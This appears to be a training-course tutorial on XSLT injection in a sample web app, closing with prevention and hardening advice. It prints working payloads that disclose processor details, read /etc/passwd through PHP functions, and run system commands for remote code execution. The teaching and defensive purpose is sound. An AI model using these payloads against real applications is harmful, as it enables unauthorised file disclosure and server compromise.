For instance, we can use these **XSL elements** to create a list of all fruits that are of a **medium size ordered by their colour in descending order**:
```xml (XSLT)
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all fruits of medium size ordered by their color:
		<xsl:for-each select="fruit">
			<xsl:sort select="color" order="descending" />
			<xsl:if test="size = 'Medium'">
				<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
			</xsl:if>
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```
This results in the following data:
```
Here are all fruits of medium size ordered by their color:
	Banana (Yellow)
	Apple (Red)
```
**XSLT** can be used to **generate arbitrary output strings**. For instance, web app's may use it to embed data from  **XML documents** within an **HTML** response.

As the name suggests, **XSLT injection** occurs whenever user input is inserted into **XSL** data before output generation by the **XSLT processor**.
This enables an attacker to inject additional **XSL elements** into the **XSL** data, which the **XSLT** processor will execute during output generation.
## Exploiting XSLT Injection
### Identifying XSLT Injection
Our sample web app displays basic information about some **Academy modules**:
![[Pasted image 20241216193256.png]]
At the bottom of the page, we can provide a **username** that is inserted into the **headline** at the top of the list:
![[Pasted image 20241216193323.png]]

The name we provide is reflected on the page. Suppose the web app stores the module information in an **XML document** and displays the data using **XSLT processing**. 
In that case, it might suffer from **XSLT injection** if our name is inserted without sanitization before **XSLT processing**. 
To confirm that, let us try to inject a **broken XML tag** to try to provoke an error in the web app. We can achieve this by providing the username `<`:
![[Pasted image 20241216193456.png]]
As we can see, the web application responds with a server error. While this does not confirm that an **XSLT injection** vulnerability is present, it might indicate the presence of a security issue.
### Information Disclosure
We can try to infer some basic information about the **XSLT processor** in use by injecting the following **XSLT elements**:
```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```
The web app provides the following response:
![[Pasted image 20241216193921.png]]
Since the web application interpreted the **XSLT elements** we provided, this confirms an **XSLT injection** vulnerability.
Furthermore, we can deduce that the web app seems to rely on the `libxslt` library and supports **XSLT** version `1.0`.
### Local File Inclusion (LFI)
We can try to use multiple different functions to read a local file. Whether a payload will work depends on the **XSLT version** and the configuration of the **XSLT library**. 
For instance, **XSLT** contains a function `unparsed-text` that can be used to read a local file:
```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```
However, it was only introduced in **XSLT version 2.0.** Thus, our sample web app does not support this function **and instead errors out**. 
However, if the **XSLT** library is configured to support **PHP** functions, we can call the **PHP** function `file_get_contents` using the following **XSLT element**:
```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```
Our sample web app is configured to support **PHP** functions. As such, the local file is displayed in the response:
![[Pasted image 20241216194137.png]]
### Remote Code Execution (RCE)
If an **XSLT** processor supports **PHP** functions, we can call a **PHP** function that executes a local system command to obtain **RCE**. 
For instance, we can call the **PHP** function `system` to execute a command:
```xml
<xsl:value-of select="php:function('system','id')" />
```
![[Pasted image 20241216194221.png]]
## Preventing XSLT Injection
**XSLT injection** can be prevented by ensuring that user input is **not** inserted into **XSL data** before processing by the **XSLT processor**. 
However, if the output should reflect values provided by the user, user-provided data might be required to be added to the **XSL document** before processing. In this case, it is essential to implement proper sanitization and input validation to avoid **XSLT injection**. 
This may prevent attackers from injecting additional **XSLT elements**, but the implementation may depend on the output format.

For instance, if the **XSLT processor** generates an **HTML** response, **HTML-encoding** user input before inserting it into the **XSL** data can prevent **XSLT injection**. As **HTML-encoding** converts all instances of `<` to `&lt;` and `>` to `&gt;`, an attacker should not be able to inject additional **XSLT elements**, thus preventing **XSLT injection**.

Additional hardening measures such as:
1. Running the XSLT processor as a low-privilege process 
2. Preventing the use of external functions by turning off PHP functions within XSLT 
3. Keeping the XSLT library up-to-date
can mitigate the impact of potential **XSLT injection** vulnerabilities.